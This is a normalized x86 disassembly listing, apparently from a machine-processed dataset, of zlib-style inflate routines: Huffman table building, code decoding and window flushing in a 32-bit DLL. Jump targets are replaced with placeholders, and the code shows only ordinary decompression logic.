mov eax [ esi + 0x2c ]
cmp edx eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_1000c0b0
mov edx [ esi + 0x34 ]
mov ecx [ esi + 0x30 ]
add esp 0xc
cmp ecx edx
je r-xdata
mov ecx [ esp + 0x28 ]
sub ebx 0x8
inc ecx
dec ebp
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] ecx
mov [ esi + 0x34 ] edx
mov ecx [ eax + 0x18 ]
mov edx [ eax + 0x14 ]
push edi
push esi
push ecx
push edx
xor ecx ecx
xor edx edx
mov cl [ eax + 0x11 ]
mov dl [ eax + 0x10 ]
push ecx
push edx
call sub_1000c1f0
mov ecx [ edi + 0x4 ]
mov edx [ esi + 0x20 ]
mov ebp [ edi ]
mov ebx [ esi + 0x1c ]
mov [ esp + 0x40 ] ecx
mov ecx [ esi + 0x30 ]
mov [ esp + 0x3c ] edx
mov edx [ esi + 0x34 ]
add esp 0x18
cmp edx ecx
mov [ esp + 0x2c ] eax
jae r-xdata
test cl 0x10
je r-xdata
mov ecx [ eax + 0x4 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
mov [ eax ] 0x6
jmp r-xdata
mov eax [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] eax
mov ebx [ edi ]
mov eax [ edi + 0x8 ]
mov ecx ebp
sub ecx ebx
mov [ edi + 0x4 ] 0x0
add eax ecx
mov [ edi ] ebp
mov [ edi + 0x8 ] eax
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x4
mov [ eax + 0xc ] ecx
jmp r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
dec eax
mov ecx ebx
mov [ esp + 0x28 ] eax
xor eax eax
mov al [ ebp ]
add ebx 0x8
shl eax cl
mov ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] 0x0
or ecx eax
mov eax [ esp + 0x18 ]
inc ebp
cmp ebx eax
mov [ esp + 0x24 ] ecx
jb r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ esp + 0x14 ]
test ecx ecx
jne r-xdata
add eax ecx
mov ecx [ esi + 0x28 ]
cmp eax ecx
jb r-xdata
mov ecx [ eax ]
cmp ecx 0x9
ja r-xdata
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_1000c0b0
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x8
mov ecx [ esp + 0x24 ]
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ecx
mov ecx [ esp + 0x28 ]
mov ebx [ edi ]
mov [ edi + 0x4 ] ecx
mov ecx ebp
push eax
sub ecx ebx
mov ebx [ edi + 0x8 ]
add ebx ecx
push edi
mov [ edi + 0x8 ] ebx
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov ecx [ esi + 0x2c ]
sub ecx edx
sub ecx edx
dec ecx
jmp r-xdata
test cl 0x40
jne r-xdata
mov eax [ esp + 0x10 ]
and ecx 0xf
mov [ eax + 0x8 ] ecx
mov ecx [ esp + 0x18 ]
mov ecx [ ecx + 0x4 ]
mov [ eax ] 0x2
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov ecx [ esp + 0x18 ]
inc edx
mov [ esp + 0x2c ] 0x0
mov cl [ ecx ]
mov [ edx - 0x1 ] cl
mov ecx [ esp + 0x18 ]
inc ecx
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x14 ]
dec ecx
mov [ esp + 0x14 ] ecx
mov ecx [ esp + 0x18 ]
cmp ecx [ esi + 0x2c ]
jne r-xdata
mov eax [ esi + 0x2c ]
cmp edx eax
mov [ esp + 0x1c ] eax
jne r-xdata
mov ecx [ esp + 0x1c ]
mov [ esp + 0x18 ] eax
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov ecx [ esp + 0x10 ]
dec eax
neg eax
sbb eax eax
and eax 0x2
add eax 0x7
mov [ ecx ] eax
mov eax ecx
jmp r-xdata
test eax eax
mov [ esp + 0x14 ] ecx
je r-xdata
mov eax [ esp + 0x10 ]
test cl 0x20
je r-xdata
mov eax [ esp + 0x10 ]
mov [ eax + 0xc ] ecx
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x4 ]
lea ecx [ eax + ecx * 8 ]
mov eax [ esp + 0x10 ]
mov [ eax + 0x8 ] ecx
jmp r-xdata
mov ecx [ eax + 0x4 ]
dec ecx
mov [ eax + 0x4 ] ecx
jne r-xdata
mov ecx [ esi + 0x28 ]
mov [ esp + 0x18 ] ecx
mov [ esi + 0x34 ] edx
mov edx [ esp + 0x2c ]
push edx
push edi
push esi
call sub_1000c0b0
mov edx [ esi + 0x34 ]
mov [ esp + 0x38 ] eax
mov eax [ esi + 0x30 ]
add esp 0xc
cmp edx eax
jae r-xdata
mov eax [ esi + 0x30 ]
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ eax ] 0x9
mov [ edi + 0x18 ] rw-data
jmp r-xdata
mov [ eax ] 0x7
jmp r-xdata
mov ecx [ esi + 0x2c ]
sub ecx edx
mov ecx eax
sub ecx edx
dec ecx
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x28 ]
mov [ esi + 0x20 ] eax
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov eax ebp
mov [ edi + 0x4 ] ecx
mov ecx [ edi + 0x8 ]
sub eax ebx
mov [ edi ] ebp
add ecx eax
mov [ edi + 0x8 ] ecx
mov ecx [ esp + 0x2c ]
push ecx
push edi
push esi
mov [ esi + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov ecx [ esp + 0x24 ]
mov eax [ esp + 0x28 ]
mov [ esi + 0x20 ] ecx
mov [ esi + 0x1c ] ebx
mov ebx [ edi ]
mov ecx ebp
mov [ edi + 0x4 ] eax
mov eax [ edi + 0x8 ]
sub ecx ebx
push 0xfffffffd
add eax ecx
push edi
mov [ edi + 0x8 ] eax
mov [ edi ] ebp
push esi
mov [ esi + 0x34 ] edx
call sub_1000c0b0
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x28 ]
cmp eax ecx
je r-xdata
mov [ esp + 0x14 ] ecx
mov ecx [ esi + 0x2c ]
cmp edx ecx
mov [ esp + 0x1c ] ecx
jne r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx ecx
cmp edx eax
jae r-xdata
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
mov [ esp + 0x14 ] eax
mov eax [ esp + 0x1c ]
sub eax edx
sub eax edx
dec eax
jmp r-xdata
mov [ esp + 0x14 ] eax
sub_1000b980
push ecx
push ebx
push edi
mov edi [ esp + 0x20 ]
push 0x4
push 0x13
mov [ esp + 0x10 ] 0x0
mov eax [ edi + 0x28 ]
push eax
call [ edi + 0x20 ]
mov ebx eax
add esp 0xc
test ebx ebx
jne r-xdata
mov edx [ esp + 0x1c ]
mov eax [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x18 ]
push esi
lea ecx [ esp + 0x10 ]
push ebx
push ecx
mov ecx [ esp + 0x20 ]
push edx
push ebp
push eax
push 0x0
push 0x0
push 0x13
push 0x13
push ecx
call sub_1000ba30
mov esi eax
add esp 0x28
cmp esi 0xfffffffd
jne r-xdata
pop edi
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffb
je r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
mov [ edi + 0x18 ] rw-data
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
mov [ edi + 0x18 ] rw-data
mov esi 0xfffffffd
cmp [ ebp ] 0x0
jne r-xdata
mov edx [ edi + 0x28 ]
push ebx
push edx
call [ edi + 0x24 ]
add esp 0x8
mov eax esi
pop esi
pop ebp
pop edi
pop ebx
pop ecx
retn
sub_1000ba30
sub esp 0x100
mov ecx [ esp + 0x104 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x114 ]
push edi
xor edi edi
mov edx esi
mov [ esp + 0x54 ] edi
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] edi
mov [ esp + 0x64 ] edi
mov [ esp + 0x68 ] edi
mov [ esp + 0x6c ] edi
mov [ esp + 0x70 ] edi
mov [ esp + 0x74 ] edi
mov [ esp + 0x78 ] edi
mov [ esp + 0x7c ] edi
mov [ esp + 0x80 ] edi
mov [ esp + 0x84 ] edi
mov [ esp + 0x88 ] edi
mov [ esp + 0x8c ] edi
mov [ esp + 0x90 ] edi
mov eax [ ecx ]
add ecx 0x4
mov ebp [ esp + eax * 4 + 0x54 ]
lea eax [ esp + eax * 4 + 0x54 ]
inc ebp
dec edx
mov [ eax ] ebp
jne r-xdata
cmp [ esp + 0x54 ] esi
jne r-xdata
mov ebx [ esp + 0x12c ]
mov ecx 0x1
lea eax [ esp + 0x58 ]
mov ebp [ ebx ]
mov [ esp + 0x10 ] ebp
mov ecx [ esp + 0x128 ]
mov edx [ esp + 0x12c ]
mov [ ecx ] edi
mov [ edx ] edi
mov eax ecx
cmp ebp ecx
mov [ esp + 0x14 ] eax
jae r-xdata
inc ecx
add eax 0x4
cmp ecx 0xf
jbe r-xdata
mov edx 0xf
lea esi [ esp + 0x90 ]
mov [ esp + 0x10 ] ecx
mov ebp ecx
cmp [ eax ] edi
jne r-xdata
cmp ebp edx
mov [ esp + 0x2c ] edx
jbe r-xdata
dec edx
sub esi 0x4
cmp edx edi
jne r-xdata
mov esi 0x1
mov [ ebx ] ebp
shl esi cl
cmp ecx edx
jae r-xdata
mov [ esp + 0x10 ] edx
mov ebp edx
cmp [ esi ] edi
jne r-xdata
lea ecx [ edx * 4 ]
mov [ esp + 0x20 ] ecx
mov ebx [ esp + ecx + 0x54 ]
lea ecx [ esp + ecx + 0x54 ]
sub esi ebx
mov [ esp + 0x44 ] esi
jns r-xdata
lea ebx [ esp + ecx * 4 + 0x54 ]
add ebx esi
mov [ esp + 0x98 ] edi
mov [ ecx ] ebx
xor ecx ecx
dec edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x100
retn
inc ecx
add ebx 0x4
shl esi 0x1
cmp ecx edx
jb r-xdata
mov edx [ esp + 0x114 ]
xor ebx ebx
xor ebx ebx
sub esi [ ebx ]
js r-xdata
mov ecx [ esp + 0x118 ]
inc ebx
cmp ebx ecx
jb r-xdata
mov edx [ esp + ecx * 4 + 0x94 ]
mov esi [ esp + 0x138 ]
lea ecx [ esp + ecx * 4 + 0x94 ]
mov [ esi + edx * 4 ] ebx
mov esi [ esp + 0x44 ]
inc edx
mov [ ecx ] edx
mov edx [ esp + 0x1c ]
add ecx [ esp + ebx + 0x58 ]
add ebx 0x4
dec edx
mov [ esp + ebx + 0x98 ] ecx
jne r-xdata
mov ecx [ edx ]
add edx 0x4
cmp ecx edi
mov [ esp + 0x1c ] edx
je r-xdata
mov ecx [ esp + 0x20 ]
mov ebx ebp
neg ebx
mov edx [ esp + ecx + 0x94 ]
mov ecx [ esp + 0x138 ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
cmp eax ecx
mov [ esp + 0x118 ] edx
mov [ esp + 0x38 ] edi
mov [ esp + 0x94 ] edi
mov [ esp + 0x18 ] 0xffffffff
mov [ esp + 0xd4 ] edi
mov [ esp + 0x40 ] edi
mov [ esp + 0x3c ] edi
jg r-xdata
cmp esi edi
je r-xdata
mov esi [ esp + 0x34 ]
lea edx [ eax - 0x1 ]
lea ecx [ esp + eax * 4 + 0x54 ]
mov [ esp + 0x20 ] edx
mov [ esp + 0x28 ] ecx
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
cmp [ esp + 0x2c ] 0x1
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
add ecx 0x4
inc eax
mov [ esp + 0x28 ] ecx
mov ecx [ esp + 0x2c ]
inc edx
cmp eax ecx
mov [ esp + 0x14 ] eax
mov [ esp + 0x20 ] edx
jle r-xdata
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffb
pop ebx
add esp 0x100
retn
mov edx [ esp + 0x28 ]
mov edx [ edx ]
mov ecx edx
dec edx
test ecx ecx
mov [ esp + 0x24 ] edx
je r-xdata
mov esi [ esp + 0x44 ]
xor edi edi
lea ecx [ ebx + ebp ]
cmp eax ecx
jle r-xdata
mov ecx [ esp + 0x138 ]
mov dl al
mov ebp [ esp + 0x1c ]
sub dl bl
mov [ esp + 0x31 ] dl
mov edx [ esp + 0x118 ]
lea ecx [ ecx + edx * 4 ]
cmp ebp ecx
jb r-xdata
inc edx
mov [ esp + 0x50 ] edx
jmp r-xdata
mov esi [ ebp ]
mov ecx [ esp + 0x11c ]
cmp esi ecx
jae r-xdata
mov [ esp + 0x30 ] 0xc0
jmp r-xdata
mov edx [ esp + 0x18 ]
add ebx ebp
inc edx
add ecx ebp
mov [ esp + 0x18 ] edx
mov edx [ esp + 0x2c ]
sub edx ebx
mov [ esp + 0x48 ] ecx
cmp edx ebp
jbe r-xdata
sub esi ecx
mov ecx [ esp + 0x124 ]
shl esi 0x2
mov dl [ esi + ecx ]
mov ecx [ esp + 0x120 ]
add dl 0x50
mov esi [ esi + ecx ]
mov [ esp + 0x30 ] dl
cmp esi 0x100
sbb dl dl
and dl 0xa0
add dl 0x60
mov [ esp + 0x30 ] dl
jmp r-xdata
mov ecx eax
mov edx 0x1
sub ecx ebx
mov eax edi
shl edx cl
mov ecx ebx
shr eax cl
cmp eax [ esp + 0x3c ]
jae r-xdata
mov edi [ esp + 0x50 ]
mov ecx eax
sub ecx ebx
mov eax 0x1
shl eax cl
cmp eax edi
jbe r-xdata
mov edx ebp
mov ecx [ esp + 0x20 ]
mov eax 0x1
shl eax cl
test edi eax
je r-xdata
mov ecx [ esp + 0x40 ]
lea ecx [ ecx + eax * 8 ]
add ebp 0x4
mov [ esp + 0x1c ] ebp
mov ebp [ esp + 0x134 ]
mov edx 0x1
shl edx cl
mov eax [ ebp ]
mov [ esp + 0x3c ] edx
add edx eax
cmp edx 0x5a0
ja r-xdata
mov ebp [ esp + 0x24 ]
or edi 0xffffffff
sub edi ebp
mov ebp [ esp + 0x28 ]
add eax edi
cmp ecx edx
jae r-xdata
mov edx [ esp + 0x18 ]
mov ebp 0x1
mov ecx ebx
xor edi eax
shl ebp cl
mov ecx [ esp + edx * 4 + 0x94 ]
lea eax [ esp + edx * 4 + 0x94 ]
mov [ esp + 0x38 ] edi
dec ebp
and ebp edi
cmp ebp ecx
je r-xdata
xor edi eax
shr eax 0x1
test edi eax
jne r-xdata
mov ebp [ esp + 0x30 ]
add eax edx
mov [ ecx ] ebp
lea ebp [ edx * 8 ]
mov [ ecx + 0x4 ] esi
add ecx ebp
cmp eax [ esp + 0x3c ]
jb r-xdata
mov edi [ esp + 0x130 ]
mov [ ebp ] edx
mov edx [ esp + 0x18 ]
lea eax [ edi + eax * 8 ]
mov edi [ esp + 0x18 ]
test edx edx
lea edi [ esp + edi * 4 + 0xd4 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x4c ] edi
mov [ edi ] eax
je r-xdata
inc ecx
cmp ecx edx
jae r-xdata
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x10 ]
mov edx eax
dec eax
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x14 ]
test edx edx
jne r-xdata
mov ebp [ esp + 0x10 ]
dec edx
sub ebx ebp
mov ebp 0x1
mov ecx ebx
sub eax 0x4
shl ebp cl
mov ecx [ eax ]
dec ebp
and ebp edi
cmp ebp ecx
jne r-xdata
mov ecx [ esp + 0x128 ]
mov edi [ esp + 0x38 ]
mov [ ecx ] eax
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x10 ]
mov esi [ esp + 0x40 ]
mov [ esp + 0x30 ] cl
mov ecx ebx
mov [ esp + edx * 4 + 0x94 ] edi
mov edx [ esp + 0x4c ]
mov [ esp + 0x31 ] al
sub ecx eax
mov eax edi
shr eax cl
mov ecx [ edx - 0x4 ]
mov edx [ esp + 0x30 ]
sub esi ecx
sar esi 0x3
sub esi eax
mov [ ecx + eax * 8 ] edx
mov [ ecx + eax * 8 + 0x4 ] esi
jmp r-xdata
mov edi [ ebp + 0x4 ]
add ebp 0x4
shl eax 0x1
cmp eax edi
jbe r-xdata
mov edx [ esp + 0x24 ]
mov [ esp + 0x18 ] edx
mov ebp [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x14 ]
cmp eax ecx
jg r-xdata
sub eax edi
inc ecx
cmp ecx edx
jb r-xdata
sub_1000bef0
push ecx
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
mov eax [ ebx + 0x28 ]
push edi
push 0x4
push 0x120
push eax
mov [ esp + 0x1c ] 0x0
call [ ebx + 0x20 ]
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x2c ]
push eax
push ecx
push r--data
push r--data
push 0x101
push ebp
push edx
call sub_1000ba30
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfffffffc
je r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x38 ]
push edx
mov edx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x30 ]
push ecx
push r--data
push r--data
push esi
lea ecx [ eax + ebp * 4 ]
push edx
push ecx
call sub_1000ba30
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov edx [ esp + 0x28 ]
cmp [ edx ] 0x0
jne r-xdata
cmp esi 0xfffffffb
jne r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x28 ]
push edi
push eax
call [ ebx + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp ebp 0x101
ja r-xdata
cmp esi 0xfffffffc
je r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov ecx [ ebx + 0x28 ]
push edi
push ecx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_1000c0b0
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x18 ]
mov ebp [ ebx + 0x34 ]
push edi
mov edi [ ebx + 0x30 ]
mov eax [ esi + 0xc ]
cmp edi ebp
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] edi
jbe r-xdata
mov eax [ esi + 0x10 ]
sub ebp edi
cmp ebp eax
jbe r-xdata
mov ebp [ ebx + 0x2c ]
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ esi + 0x14 ]
sub eax ebp
add edx ebp
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov ecx ebp
mov esi edi
mov edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx edx
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov edi [ esp + 0x10 ]
mov ecx [ ebx + 0x2c ]
add edi ebp
cmp eax ecx
mov [ esp + 0x10 ] edi
jne r-xdata
mov ecx [ ebx + 0x3c ]
push ebp
push edi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ esi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
pop edi
pop esi
mov [ ecx + 0xc ] edx
mov [ ebx + 0x30 ] eax
mov eax [ esp + 0x18 ]
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x34 ]
mov esi [ ebx + 0x28 ]
cmp eax ecx
mov [ esp + 0x18 ] esi
jne r-xdata
mov edi [ esp + 0x1c ]
mov ebp [ ebx + 0x34 ]
sub ebp esi
mov eax [ edi + 0x10 ]
cmp ebp eax
jbe r-xdata
mov [ ebx + 0x34 ] esi
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ edi + 0x14 ]
sub eax ebp
add edx ebp
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx ebp
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
add eax ebp
mov ecx edx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov [ esp + 0x18 ] eax
mov ecx [ ebx + 0x3c ]
push ebp
push esi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
sub_1000c1f0
sub esp 0x14
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push ebx
push ebp
mov ebp [ eax ]
mov eax [ eax + 0x4 ]
mov edx [ ecx + 0x20 ]
push esi
mov esi [ ecx + 0x30 ]
push edi
mov edi [ ecx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ecx + 0x1c ]
cmp edi esi
mov [ esp + 0x18 ] ebp
jae r-xdata
mov ecx [ ecx + 0x2c ]
sub ecx edi
mov [ esp + 0x14 ] ecx
sub esi edi
dec esi
mov [ esp + 0x14 ] esi
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x30 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0x14
jb r-xdata
mov ecx [ esp + 0x28 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov cl [ esi + 0x4 ]
mov [ edi ] cl
mov ecx [ esp + 0x14 ]
inc edi
dec ecx
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov [ esp + 0x18 ] ebp
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
jae r-xdata
cmp [ esp + 0x10 ] 0xa
jb r-xdata
and ebx 0xf
sub eax ebx
mov ecx [ ebx * 4 + rw-data ]
and ecx edx
add ecx [ esi + 0x4 ]
mov [ esp + 0x2c ] ecx
mov ecx ebx
shr edx cl
cmp eax 0xf
jae r-xdata
test bl 0x40
jne r-xdata
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ecx ebx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x34 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0xf
jb r-xdata
test bl 0x20
je r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
cmp eax 0x14
jae r-xdata
and ebx 0xf
cmp eax ebx
jae r-xdata
test bl 0x40
jne r-xdata
mov [ esp + 0x18 ] ebp
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
